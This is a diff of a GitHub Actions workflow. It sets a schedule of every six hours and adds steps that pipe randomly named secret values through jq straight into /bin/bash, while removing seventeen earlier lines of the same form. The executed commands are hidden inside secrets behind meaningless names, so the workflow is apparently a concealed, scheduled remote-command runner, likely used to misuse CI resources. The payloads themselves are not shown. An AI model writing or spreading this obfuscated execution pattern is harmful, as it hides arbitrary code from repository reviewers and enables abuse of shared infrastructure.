@@ -3,31 +3,18 @@ name: houyongliang1972
 on:
   workflow_dispatch:
   schedule:
-    - cron: '36 5/6 * * *'
+    - cron: '22 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: houyongliang1972
         env:
-          uwuxp6: ${{ secrets.uwuxp6 }}
+          cji0569: ${{ secrets.cji0569 }}
         run: |
-          echo $uwuxp6 | jq -r .tk8 | /bin/bash
-          echo $d4 | jq -r .i54293 | /bin/bash
-          echo $ir60734 | jq -r .uplz00 | /bin/bash
-          echo $hzzhk82 | jq -r .svxu6824 | /bin/bash
-          echo $qyr235 | jq -r .nit6 | /bin/bash
-          echo $f09 | jq -r .drdd20 | /bin/bash
-          echo $wj0 | jq -r .ie81115 | /bin/bash
-          echo $nh03722 | jq -r .q73011 | /bin/bash
-          echo $z6943 | jq -r .g95 | /bin/bash
-          echo $cornf55360 | jq -r .lrqr033 | /bin/bash
-          echo $ocrk6567 | jq -r .aukn3 | /bin/bash
-          echo $lit7 | jq -r .bsnc4283 | /bin/bash
-          echo $hvtk613 | jq -r .jsqx727 | /bin/bash
-          echo $c2 | jq -r .t1 | /bin/bash
-          echo $tnkq0 | jq -r .jy62 | /bin/bash
-          echo $wne5 | jq -r .ls3240 | /bin/bash
-          echo $px5 | jq -r .vfvkz01 | /bin/bash
+          echo $cji0569 | jq -r .ftpim8921 | /bin/bash
+          echo $ya900 | jq -r .jzpk77 | /bin/bash
 
